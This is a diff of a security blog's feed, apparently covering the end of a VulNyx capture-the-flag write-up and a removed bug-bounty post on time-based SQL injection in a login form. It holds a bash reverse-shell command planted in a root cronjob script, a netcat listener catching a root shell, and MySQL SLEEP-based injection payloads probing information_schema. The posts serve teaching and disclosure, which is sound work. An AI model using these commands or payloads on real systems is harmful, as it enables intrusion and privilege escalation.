+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;/home/candidate/.scripts
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#/bin/bash&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; makeBackup.sh
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;makeBackup.sh
+&lt;span class=&quot;gp&quot;&gt;-e #&lt;/span&gt;/bin/bash
+&lt;span class=&quot;gp&quot;&gt;bash -c &apos;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a few seconds (at the most you have to wait 1 minute), we receive the &lt;em&gt;root&lt;/em&gt; shell&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1235 
+&lt;span class=&quot;go&quot;&gt;listening on [any] 1235 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 47866
+bash: cannot set terminal process group (3479): Inappropriate ioctl for device
+bash: no job control in this shell
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;whoami
+root
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;pwd
+/root
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;ls
+root.txt
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we can see that the root flag is in &lt;em&gt;/root/root.txt&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-3&quot; /&gt;
+
+&lt;h2 id=&quot;33-why-does-this-privilege-escalation-via-cronjob-exist&quot;&gt;3.3. Why does this privilege escalation via cronjob exist?&lt;/h2&gt;
+
+&lt;p&gt;This method worked because 2 conditions were met at the same time:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The cronjob is executed with the &lt;em&gt;root&lt;/em&gt; user.&lt;/li&gt;
+  &lt;li&gt;The script that runs the cronjob is editable by any user.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Both conditions are necessary to perform this privilege escalation.&lt;/strong&gt; To understand it better, let’s think what would happen if one of the 2 conditions were not met:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If the cronjob is not executed as &lt;em&gt;root&lt;/em&gt; user but for example with the &lt;em&gt;candidate&lt;/em&gt; user, then even if we could modify the script &lt;em&gt;makeBackup.sh&lt;/em&gt;, we would get a shell with the &lt;em&gt;candidate&lt;/em&gt; user.&lt;/li&gt;
+  &lt;li&gt;If the script that is executed is not editable by any user then there is no way to intervene in the cronjob execution flow, at least by directly editing the script. The only thing we could do is to look for other scripts or functionalities that allow to write in the &lt;em&gt;makeBackup.sh&lt;/em&gt; script to inject code in the cronjob. This is too specific and does not have to happen.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="ctf" /><category term="vulnyx" /><category term="nmap" /><category term="web" /><category term="burpsuite" /><category term="arbitrary file upload" /><category term="ffuf" /><category term="directory listing" /><category term="command injection" /><category term="cronjob" /><summary type="html">Writeup of the machine Diff3r3ntS3c from VulNyx.</summary></entry><entry><title type="html">VulNyx: HackingStation</title><link href="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/" rel="alternate" type="text/html" title="VulNyx: HackingStation" /><published>2024-03-31T00:00:00+01:00</published><updated>2024-03-31T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Port and service scanning&lt;/a&gt;&lt;/li&gt;
@@ -20,7 +595,7 @@
 
 &lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png&quot; style=&quot;width: 750px;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In this post we are going to see the writeup of the machine HackingStation from &lt;a href=&quot;https://vulnyx.com/&quot;&gt;VulNyx&lt;/a&gt;. It’s an easy machine created by &lt;a href=&quot;https://hackcommander.github.io/&quot;&gt;HackCommander&lt;/a&gt; (yeah, it’s me :blush:) especially designed for beginners. We are going to get access to the machine through a command injection in a web and then to escalate privileges through an nmap binary, which is allowed to run as superuser without password.&lt;/p&gt;
+&lt;p&gt;In this post we are going to see the writeup of the machine HackingStation from &lt;a href=&quot;https://vulnyx.com/&quot;&gt;VulNyx&lt;/a&gt;. It’s an easy machine created by &lt;a href=&quot;https://hackcommander.github.io/&quot;&gt;HackCommander&lt;/a&gt; (yeah, it’s me :blush:) especially designed for beginners. We are going to get access to the machine through a command injection in a web and then to escalate privileges through the nmap binary, which is allowed to run as superuser without password.&lt;/p&gt;
 
 &lt;div id=&quot;section-id-1&quot; /&gt;
 
@@ -2769,335 +3344,4 @@ prompt
   &lt;li&gt;&lt;em&gt;Metasploitable 2&lt;/em&gt; is a good environment for testing certain vulnerabilities and not having to create a vulnerable environment from scratch.&lt;/li&gt;
   &lt;li&gt;Low severity vulnerabilities such as PHP info page disclosure are usually wrongly evaluated as “low severity” is often considered synonymous with “not important”.&lt;/li&gt;
   &lt;li&gt;PHP info page disclosure can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag of some user cookies and exfiltrate them during an XSS exploitation. The only requirement is that the cookie path must be a parent path of the path where the PHP info page is located.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="pentesting article" /><category term="web" /><category term="burpsuite" /><category term="base64" /><category term="metasploitable 2" /><category term="xss" /><category term="exfiltrate cookies" /><category term="session hijacking" /><category term="php info page" /><category term="bypass" /><summary type="html">Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.</summary></entry><entry><title type="html">Time-based SQL injection in a login form</title><link href="https://hackcommander.github.io/posts/2022/10/17/sql-injection-in-a-login-form/" rel="alternate" type="text/html" title="Time-based SQL injection in a login form" /><published>2022-10-17T00:00:00+02:00</published><updated>2022-10-17T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2022/10/17/sql-injection-in-a-login-form</id><content type="html" xml:base="https://hackcommander.github.io/posts/2022/10/17/sql-injection-in-a-login-form/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Is it possible to extract information from the database through this type of SQL injections?&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;In this post I am going to show the most critical vulnerability I have reported in a bug bounty program so far: a time-based SQL injection in a login form.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-1&quot; /&gt;
-
-&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;
-
-&lt;p&gt;I found this asset through &lt;a href=&quot;https://leakix.net/&quot;&gt;LeakIX&lt;/a&gt;. LeakIX is an OSINT platform that combines a search engine that indexes public information and an open reporting platform linked to the results. I found this asset making a domain query of the type&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;example.com&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;and I got the following results&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/leakix-results.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;where the colours are ofustating the following info:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;span style=&quot;color:red&quot;&gt;Red&lt;/span&gt;: not important info.&lt;/li&gt;
-  &lt;li&gt;&lt;span style=&quot;color:blue&quot;&gt;Blue&lt;/span&gt;: the domain name of the company that I was looking for.&lt;/li&gt;
-  &lt;li&gt;&lt;span style=&quot;color:green&quot;&gt;Green&lt;/span&gt;: the IP of the asset.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The asset that I discovered didn’t have a related domain name, it was just an HTTP service on port 80 of an IP, so… Why did leakix return this IP as one of the results?&lt;/p&gt;
-
-&lt;p&gt;That’s because the PHP info page was present in the website and the PHP variable $_SERVER[‘SERVER_ADMIN’] had assigned an email address whose domain was the domain used in the search. Continuing with the example domain, you can think of it as the e-mail address found is something like &lt;strong&gt;admin@example.com&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;As you can see in the following HackerOne report&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1118898&quot;&gt;PHP info page disclosure report in HackerOne&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;PHP info page disclosure is considered a low severity vulnerability but a vulnerability should not be underestimated by its scoring. For example, the PHP info page can be used to bypass the HttpOnly flag in the cookies during the exploitation of an XSS to get a session hijacking.&lt;/p&gt;
-
-&lt;p&gt;In this case, PHP info page disclosure has been crucial in finding this vulnerable asset because the HTTP service doesn’t have an related domain and naturally doesn’t have a TLS certificate to indicate that this asset belongs to the company in question. In fact, the company asked me how I had found this asset since they didn’t have it in their inventory.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-2&quot; /&gt;
-
-&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;
-
-&lt;p&gt;When I accessed to the website, I saw the following landing page&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/landing-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;with the company logo and, when I saw this, I was sure that the asset belonged to the company.&lt;/p&gt;
-
-&lt;p&gt;The website was an operations center for the clients of the company and it looked very simple, in fact Wappalyzer didn’t alert me that any web framework had been used. That’s a very good fact because to not use a web framework is usually less safe than using it.&lt;/p&gt;
-
-&lt;p&gt;As you can see, the website has 2 buttons: one for login and the other one for signing up. The signing up button didn’t work because it was a closed registration website and to sign up on the website it was necessary to send an email to the email address that I have obfuscated with blue color. That was the same email address that appeared in the PHP variable $_SERVER[‘SERVER_ADMIN’] in the results of LeakIX.&lt;/p&gt;
-
-&lt;p&gt;After clicking in the login button I got the following login form&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/login-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;but… How did I discover the vulnerability?&lt;/p&gt;
-
-&lt;p&gt;I sent a login request and intercepted it with Burpsuite. Then using the repeater I sent a request with a typical SQL injection payload in the parameter nombre_usuario and I got the following response&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/error-500.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The characters such as single quote, hashtag and others are the typical characters that can lead to break the SQL query (in this case, a SQL query to verify the credentials) in the backend, and getting an HTTP error 500 response is the symptom that there could be a SQL injection.&lt;/p&gt;
-
-&lt;p&gt;You can see more info about how to detect SQL injection vulnerabilities in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection&quot;&gt;How to detect SQL injection vulnerabilities&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;An interesting fact is that the parameter password didn’t appear to be vulnerable. We will see why this might be in the section 3.2 but it could be because this parameter is not being entered in the vulnerable query.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-3&quot; /&gt;
-
-&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;
-
-&lt;div id=&quot;section-id-3-1&quot; /&gt;
-
-&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;
-
-&lt;p&gt;First of all, it’s necessary to guess what is the DataBase Management System (DBMS), because each of them uses a different syntax. In the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection/cheat-sheet&quot;&gt;SQL injection cheat sheet&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;you can see different payloads for different DBMS and purposes.&lt;/p&gt;
-
-&lt;p&gt;This is not a CTF so, to discover the DBMS, it’s always best to examine the website well before fuzzing intensely.&lt;/p&gt;
-
-&lt;p&gt;Do you remember the PHP info page disclosure vulnerability? Yes, this page will be useful in this step too, this is the power of a low severity vulnerability. As you can see in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/php-info-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;looking at the info.php page I found several references to MySQL. So MySQL is a candidate to be the DBMS used in the query.&lt;/p&gt;
-
-&lt;p&gt;After a long time of testing MySQL payloads for different purposes such as login bypass, RCE… Finally the only one that worked was&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user&apos;+OR+(SELECT+SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;which is a time-based SQL injection payload, where the + sign is the URL encoded form of the space character although %20 is valid too. I don’t know why, but there was a change of units in the sleep function, that is, a value of 0.02 in the sleep function produces a delay of approximately 2 seconds (2452 miliseconds) in the response, as you can see in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/response-delay.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;To make sure that the delay was proportional to the input of the sleep function, I sent the following request to the intruder&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/intruder-positions.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;varying the value of the sleep function from 0.01 to 0.09&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/intruder-payloads.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;and the result was as follows&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/response-delay-intruder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;where you can see the payloads in the column “Payload” and the delays in the columns “Response received” and “Response completed”, in miliseconds.&lt;/p&gt;
-
-&lt;p&gt;This is the proof that SQL code is being executed.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-3-2&quot; /&gt;
-
-&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work?&lt;/h2&gt;
-
-&lt;p&gt;I don’t have the source code of the website but, I think that in the backend there was a MySQL query similar to this&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;nombre_usuario&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I think this because the parameter password didn’t appear to be vulnerable so probably only the parameter nombre_usuario was used in the vulnerable query, that is, the query to get the data of the user. After that, the password retrieved in the query will be compared with the one entered by the user.&lt;/p&gt;
-
-&lt;p&gt;If we enter a “non-malicious” user, such as&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;HackCommander
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;the query that will be executed is&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;but if we enter a “malicious” user such as&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HackCommander&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; OR (SELECT SLEEP(0.02))=1#
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and &lt;strong&gt;no input sanitization is being applied in the backend&lt;/strong&gt;, the query that will be executed is&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;would&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and, as you can see, the injected SQL code is executed in the where clause of the query. The reason of the hashtag is that the query could have some code after the evaluation of the parameter username so, to avoid syntax errors, it is a good practice to use the hashtag at the end of the payload, which is the character used in MySQL to write comments.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-3-3&quot; /&gt;
-
-&lt;h2 id=&quot;33-is-it-possible-to-extract-information-from-the-database-through-this-type-of-sql-injections&quot;&gt;3.3. Is it possible to extract information from the database through this type of SQL injections?&lt;/h2&gt;
-
-&lt;p&gt;The answer is &lt;strong&gt;yes&lt;/strong&gt;. But… Where do we get the information if we don’t know the name of any table, attribute…?&lt;/p&gt;
-
-&lt;p&gt;In MySQL, and not only in MySQL, there is an important element to get informacion from the database: the &lt;strong&gt;information schema&lt;/strong&gt;. The information schema (information_schema) is an ANSI-standard set of read-only views that provide information about all of the tables, views, columns, and procedures in a database. You can see more details about information_schema in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.sqlshack.com/learn-sql-the-information_schema-database/&quot;&gt;Learn SQL: The INFORMATION_SCHEMA Database&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;This is one of the resources used by Sqlmap to dump the content of a database in blind SQL injections, but this is not a CTF, it’s not necessary to dump all the database to get some usernames and the hashes of some passwords. In a bug bounty program it’s not necessary to dump all the database to get the bounty, it’s enough to give a PoC showing how you can get some information from the database. The most simple PoC that I could find was the following&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-sql-injection-in-a-login-form/number-of-tables-in-the-database.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;using the following payload&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;USER&apos;+OR+(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This PoC shows that the number of tables in the database is 341. I am going to explain the payload by breaking it down into several points:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/mysql-if-function/&quot;&gt;MySQL IF()&lt;/a&gt; is a MySQL function is a function that receives 3 parameters using the following syntax&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;IF(condition, value_if_true, value_if_false)&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;and it returns a value if a condition is TRUE, or another value if a condition is FALSE.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The &lt;a href=&quot;https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/&quot;&gt;information_schema.tables&lt;/a&gt; is a view that allows to obtain information about all the views and tables of the database. Therefore, the following SQL code&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
